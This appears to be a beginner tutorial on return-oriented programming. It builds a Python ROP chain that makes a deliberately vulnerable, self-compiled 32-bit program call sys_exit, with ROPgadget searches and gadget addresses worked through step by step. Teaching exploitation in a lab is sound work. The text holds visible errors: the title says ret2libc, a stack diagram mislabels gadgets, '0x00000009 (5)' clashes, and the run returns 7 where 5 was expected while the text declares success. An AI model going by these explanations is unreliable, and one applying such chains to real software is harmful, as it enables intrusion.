# EXPLOITS
## STACK BUFFER OVERFLOW FOR RETURN TO LIBC (ret2libc)
## REQUIRED TO UNDERSTAND : Stack buffer overflow to overwrite registers backups especially to redirect code execution
## Can't work if : 
```
> PIE (position independant executable) is enabled
```
## Bypasses protection :
```
> NX (non executable) because we're not executing any shellcode
> ASLR because we don't jump to any libc function
```
Return Oriented Programming, also known as ROP is an exploitation technique which is based on the program code  
Think about it, Return oriented programming... Does it have to do anything with programming ?  
The answer is yes, it has, we're going to make a program based on program instructions, yes and ASLR won't change anything because the code is not randomized, so we can simply jump to the code, jumping instructions to instructions, instructions which can be placed in any zone in the code segment if you didn't understand, let's have a look of this code in assembly in 32 bits :
```asm
addr x+0 : int 0x80
addr x+4 : ret
addr x+8 : inc eax
addr x+12 : ret
addr x+16 xor eax, eax
addr x+20 : ret
addr x+24 : pop ebx
addr x+28 : ret
```
This code in a normal point of view is completely useless, this code makes no sense, but if you rembember, the instruction pointer can be set to any address if we got a stack buffer overflow... Let's think about it for a second, what exactly the ret instruction will do ? It will set EIP to toppest value in the the stack so we can chain instructions  
I don't know your point of view but when i see this code i can also see this :
```asm
addr x+16 : xor eax, eax # EAX => 0
ret
addr x+8 : inc eax # EAX => 1
ret
addr x24 : pop ebx # EBX => The toppest value in the stack
ret
addr x+0 : int 0x80
ret
```
These instructions finishing with a ret are called gadgets, even a simple ret instruction could be a gadget  
If we could chain these gadgets this way, we will set EAX to 1, set EBX to the toppest element in the stack and then we syscall, that's amazing because we called `sys_exit` !
`sys_exit` could be useless but imagine we could chain some instructions of an executable to get a shell ! Calling `execve` !  
That's basically what is return oriented programming  
So if, with a buffer overflow, we organize the stack like this :
```
[------------------]
[overflown buffer] => ...
(EBP) : (4 bytes) => Any value
(EIP) : (4 bytes) => The first instruction address in our ropchain => x+16 -> xor eax, eax
(4 bytes) => x+8 -> xor eax, eax
(4 bytes) => x+24 -> inc eax
(4 bytes) => The value that the pop ebx will pop => Any data (example : 0x00000009 (5))
(4 bytes) => x+0 -> int 0x80
[------------------]
```
We would execute our ropchain, it will exit with the code 5 !
But... Yeah, it's possible if instructions we're looking for exists in the executable, otherwise it won't work, to know if it's the case there are a couple of ways, but we can use a really used tool called `ROPgadget`, to install it simply execute `pip install ROPgadget`  
Then we can search in the binary if there are the gadgets we're looking for, so let's compile this simple code :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void vuln()
{
	char buffer[64];
  scanf("%s", buffer);
}

int main(int argc, char ** argv) 
{
	vuln();
}
```
So we have a buffer overflow because of the scanf function here, okay, now let's use this to compile :
```
gcc <source code file.c> -o <executable> -fno-stack-protector -m32
```
Let's first use the command to see all the available gadgets in the program :
```
ROPgadget --binary <executable>
```
It gived me :
```
(...)
0x000010c4 : push esp ; mov ebx, dword ptr [esp] ; ret
0x00001009 : ret
0x00001126 : ret 0x2eb3
0x000010e6 : ret 0x2ef3
0x0000100f : retf
0x0000115e : rol byte ptr [ebx + 0x5d8b10c4], cl ; cld ; leave ; ret
0x0000101a : sal byte ptr [edx + eax - 1], 0xd0 ; add esp, 8 ; pop ebx ; ret
0x00001155 : sal byte ptr [edx + ecx - 0x7d], cl ; in al, dx ; or byte ptr [eax + 0x51], dl ; call edx
0x000010b4 : sar bh, cl ; call dword ptr [eax + 0x51]
0x000010ad : sar bh, cl ; call dword ptr [eax - 0x73]
0x00001015 : sbb al, 0 ; add byte ptr [eax], al ; test eax, eax ; je 0x101f ; call eax
0x000010c7 : sbb al, 0x24 ; ret
0x000010b2 : sbb dword ptr [eax - 0x2e], -1 ; call dword ptr [eax + 0x51]
0x000011c3 : sti ; jmp 0x1120
0x00001083 : sti ; jmp dword ptr [ebx + 0x10]
0x00001063 : sti ; jmp dword ptr [ebx + 0x18]
0x00001073 : sti ; jmp dword ptr [ebx + 0xc]
0x00001043 : sti ; push 0 ; jmp 0x1030
0x00001053 : sti ; push 8 ; jmp 0x1030
0x000012a3 : sti ; ret
0x000012a6 : sub al, 0x24 ; ret
0x00001108 : sub esp, 0x14 ; push ecx ; call eax
0x00001158 : sub esp, 8 ; push eax ; push ecx ; call edx
0x00001019 : test eax, eax ; je 0x101f ; call eax
0x00001154 : test edx, edx ; je 0x1162 ; sub esp, 8 ; push eax ; push ecx ; call edx

Unique gadgets found: 149
```
We can see we have 149 gadgets in total  
To search a specific gadget, we can do :
```
ROPgadget --binary <executable> | grep "<instruction>"
# To be a gadget, the instruction has to have a ret instruction after it, like for example : mov eax, ebx ; ret
```
Now let's search for the first instruction of the ROPchain which is the `xor eax, eax` ! :
```
ROPgadget --binary <executable> | grep "xor eax, eax"
```
Uhhh, i got nothing, looks like the gadget doesn't exist... We actually need more gadgets, to do that, we can add the `-static` flag in gcc which tell to the compiler to add all the linked libraries functions directly in the code and not just referencing them in the libc, this way, we will get the gadgets from the libc library :
```
gcc <source code file.c> -o <executable> -fno-stack-protector -m32 -static
```
Okay now let's search again :
```
ROPgadget --binary <executable> | grep "xor eax, eax"
```
It gived a lot of gadgets, but to find the exact gadget we want we can do :
```
ROPgadget --binary <executable> | grep "xor eax, eax ; ret"
```
```
(...)
0x0804fcd0 : xor eax, eax ; ret
```
Awesome, we now that (for my binary) the address `0x0804fcd0` contains our first gadget, now let's do this for every gadget we need :
```
ROPgadget --binary vuln | grep "inc eax ; ret"
# it gived me : 0x0804f522 : inc eax ; ret
ROPgadget --binary vuln | grep "pop ebx ; ret"
# it gived me : 0x08049022 : pop ebx ; ret
ROPgadget --binary vuln | grep "int 0x80"
# it gived me : 0x0804a332 : int 0x80 (there is not "; ret" at the end but it's the last instruction so it doesn't matter because we will already exit the program)
```
Okay now if we organize the stack like this :
```
[------------------]
[overflown buffer] => ...
(EBP) => Any value
(EIP) => 0x0804fcd0
(EIP+4) => 0x0804f522
(EIP+8) => 0x08049022
(EIP+12) => The return code (example : 0x00000005)
(EIP+16) => 0x0804a332
[------------------]
```
It should be perfect, now let's build the exploit :
```python
# exploit.py
"""
This code will execute sys_exit 
sys_exit syscall : eax -> 1, ebx -> <RETURN VALUE>

"""
import struct
p = 'A'*64
p += 'B'*12
p += struct.pack('<I', 0x0804fcd0) # xor eax, eax ; eax = 0 # -> EIP BACKUP (start of our instruction chain)
p += struct.pack('<I', 0x0804f522) # inc eax # ; eax = 1    # -> EIP BACKUP + 4
p += struct.pack('<I', 0x08049022) # pop ebx                # -> EIP BACKUP + 8
p += struct.pack('<I', 0x00000005) # 05                     # -> EIP BACKUP + 12
p += struct.pack('<I', 0x0804a332) # int 0x80 ; syscall     # -> EIP BACKUP + 16

print(p)
```
Now let's execute this :
```
python exploit.py | ./vuln
```
If it didn't give any segmentation fault it means that it probably worked, let's check that by seeing the return code of the exit caused by the program :
```
echo $?
# gived -> 7
```
It worked !
